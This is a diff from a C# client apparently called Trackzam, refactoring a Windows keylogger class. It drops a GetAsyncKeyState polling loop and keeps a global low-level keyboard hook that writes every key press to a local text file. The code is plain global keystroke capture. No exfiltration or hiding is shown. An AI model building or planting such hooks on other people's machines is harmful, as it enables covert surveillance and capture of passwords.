@@ -14,16 +14,15 @@ namespace TrackzamClient
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(Int32 i);
 
-        protected string logDir = "";
-        private StreamWriter writer;
-        private DispatcherTimer timer;
+        protected string _logDir = "";
+        private StreamWriter _writer;
 
-        // returns true if the path is set successfuly without errors
+        // returns true if the path is set successfully without errors
         public bool SetPath(string path)
         {
             if (Directory.Exists(path))
             {
-                logDir = path;
+                _logDir = path;
                 return true;
             }
 
@@ -31,7 +30,7 @@ namespace TrackzamClient
             {
                 DirectoryInfo di = Directory.CreateDirectory(path);
                 Console.WriteLine("Created the new dir!");
-                logDir = path;
+                _logDir = path;
                 return true;
             }
             catch (UnauthorizedAccessException) { Console.WriteLine("Access Denied"); return false; }
@@ -49,40 +48,23 @@ namespace TrackzamClient
         // for clients read-only
         public string Path
         {
-            get => logDir;
+            get => _logDir;
         }
 
         public void Start()
         {
             string fileName = "\\" + TrackzamTimer.GetNowString();
-            writer = new StreamWriter(logDir + fileName);
-            
-            timer = new DispatcherTimer();
-            timer.Tick += TrackKeys;
-            timer.Interval = new TimeSpan(0, 0, 0, 0, 1);
-            timer.Start();
-            // let's try the new one
+            _writer = new StreamWriter(_logDir + fileName);
             _hookID = SetHook(_proc);
-
-        }
-
-        void TrackKeys(object sender, EventArgs eventArgs)
-        {
-            for (int i = 0; i < 255; i++)
-            {
-                int key = GetAsyncKeyState(i);
-                if (key != 0)
-                    writer.WriteLine("< {0} {1} >", verifyKey(i), TrackzamTimer.GetNowString());
-            }
         }
 
         public void Stop()
         {
-            timer.Stop();
-            writer.WriteLine("//Closed the Window//");
-            writer.Close();
+            _writer.WriteLine("//Finished Recording//");
+            _writer.Close();
         }
 
+        // TODO delete
         private String verifyKey(int code)
         {
             String key = "";
@@ -198,7 +180,7 @@ namespace TrackzamClient
             return key;
         }
 
-        // trying a keyboard hook way start :
+        
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
         public static LowLevelKeyboardProc _proc = HookCallback;
@@ -214,22 +196,22 @@ namespace TrackzamClient
             }
         }
 
+        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
-        public delegate IntPtr LowLevelKeyboardProc(
-        int nCode, IntPtr wParam, IntPtr lParam);
-
-        public static IntPtr HookCallback(
-            int nCode, IntPtr wParam, IntPtr lParam)
+        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
+
+                // TODO let it be the logDir attribiute
                 string path = @"C:\Test\MyTest.txt";
 
                 if(!File.Exists(path))
                 {
                     using (StreamWriter sw = File.CreateText(path))
                     {
+                        // TODO use the writer of the class itself
                         sw.WriteLine("Here we start");
                     }
                 }
@@ -243,6 +225,8 @@ namespace TrackzamClient
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
+
+         // dll imports for the keylogger functionality
 
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr SetWindowsHookEx(int idHook,
